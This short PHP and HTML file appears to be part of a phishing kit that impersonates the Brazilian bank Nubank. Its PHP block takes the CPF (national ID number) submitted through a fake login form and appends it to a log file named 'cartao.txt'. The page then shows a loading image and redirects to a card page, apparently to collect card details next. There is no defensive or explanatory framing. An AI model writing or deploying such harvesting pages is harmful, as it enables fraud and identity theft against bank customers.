<?php
$cpf = $_POST['cpf']; // ID do formulário de login
$all = "CPF: ".$cpf."\n";
 
$fp = fopen("../../cartao.txt", "a");
fwrite($fp, $all);
fclose($fp);
?>

<html lang="pt">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="style.css">
    <meta http-equiv="refresh" content="2; url=../../pages/cartao/index.html">
    <title>Nubank</title>
</head>
<body>
    
    <div class="box">
        <div>
            <img src="../../image/carregando.gif">
        </div>
      </div>
            
</body>
</html>